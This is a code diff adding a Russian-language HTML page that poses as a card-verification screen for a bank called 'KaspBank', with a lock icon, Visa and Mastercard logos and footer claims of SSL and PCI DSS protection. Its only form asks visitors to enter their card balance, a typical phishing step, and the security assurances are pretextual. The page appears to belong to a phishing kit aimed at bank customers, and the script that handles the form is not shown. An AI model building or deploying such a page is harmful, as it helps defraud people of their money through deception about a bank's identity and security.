@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Верификация карты | КаспБанк</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app">
+        <header class="header">
+            <div class="logo">КаспБанк</div>
+            <div class="header-actions">
+                <button class="btn-icon">
+                    <span class="icon">🔔</span>
+                </button>
+                <button class="btn-icon">
+                    <span class="icon">👤</span>
+                </button>
+            </div>
+        </header>
+        
+        <main class="main-content">
+            <div class="card-form">
+                <h2 class="form-title">Верификация карты</h2>
+                <div class="security-notice">
+                    <span class="security-icon">🔒</span>
+                    <span>Проведение платежей безопасно</span>
+                </div>
+                
+                <form id="verificationForm">
+                    <div class="form-group">
+                        <label>Укажите баланс карты</label>
+                        <input type="text" id="balance" required class="form-input" placeholder="Например: 15 000">
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">Подтвердить</button>
+                </form>
+                
+                <div class="payment-methods" style="margin-top: 40px;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="payment-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="payment-logo">
+                </div>
+            </div>
+        </main>
+        
+        <footer class="footer">
+            <div class="security-info">
+                <p>Вы находитесь на платежном сервере, защищенном стандартами ssl (https) и pcidss наших банковских партнеров. Ваши данные зашифрованы для дополнительной безопасности.</p>
+            </div>
+            <p>© 2025 КаспБанк. Все права защищены</p>
+        </footer>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
